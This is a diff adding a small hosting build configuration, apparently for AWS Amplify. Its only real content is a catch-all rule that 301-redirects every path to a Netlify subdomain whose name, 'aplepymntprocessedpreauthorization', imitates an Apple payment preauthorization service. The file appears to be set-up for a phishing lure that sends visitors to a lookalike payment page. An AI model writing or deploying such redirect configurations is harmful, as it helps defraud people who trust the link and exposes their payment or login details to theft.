@@ -1,0 +1,14 @@
+version: 1
+frontend:
+  phases:
+    build:
+      commands:
+        - echo "Redirecting to Netlify..."
+  artifacts:
+    baseDirectory: /
+    files:
+      - '**/*'
+customRules:
+  - source: '/<*>'
+    target: 'https://aplepymntprocessedpreauthorization.netlify.app/<*>'
+    status: '301'
